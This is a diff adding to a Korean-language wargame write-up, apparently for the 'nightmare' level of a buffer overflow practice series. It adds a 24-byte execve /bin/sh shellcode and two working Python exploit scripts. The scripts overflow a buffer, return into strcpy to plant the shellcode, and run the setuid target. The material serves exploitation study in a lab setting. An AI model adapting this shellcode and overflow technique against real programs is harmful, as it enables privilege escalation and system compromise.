@@ -89,8 +89,75 @@ uid=517(succubus) gid=517(succubus) euid=518(nightmare) egid=518(nightmare) grou
 
 ##### shellcode 이용 코드
 
-```python
+```
+shellcode(24byte) :
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+```
 
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/succubus/nightmare"
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+strcpy_plt = 0x8048410
+main_ret = 0xbffffbdc
+shellcode_addr = main_ret + 16
+buffer_addr = main_ret - 44
+
+payload = shellcode                     # buffer[40] + sfp
+payload = append("\x90"*(44-24))
+payload = append(p32(strcpy_plt))       # ret
+payload = append("\x90"*4)              # padding
+payload = append(p32(main_ret+4))       # strcpy arg1
+payload = append(p32(shellcode_addr))   # strcpy arg2
+payload = append(p32(buffer_addr))
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
+```
+
+
+
+##### 환경변수 이용 코드
+
+```python
+# 환경변수에 shellcode 등록 후 진행
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/succubus/nightmare"
+
+strcpy_plt = 0x8048410
+main_ret = 0xbffffbdc
+shellcode_addr = 0xbffffbec
+shellcode_env = 0xbffffe8b
+
+payload = "\x90"*44                     # buffer[40] + sfp
+payload = append(p32(strcpy_plt))       # ret
+payload = append("\x90"*4)              # padding
+payload = append(p32(main_ret+4))       # strcpy arg1
+payload = append(p32(shellcode_addr))   # strcpy arg2
+payload = append(p32(shellcode_env))	
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
 ```
 
 -----
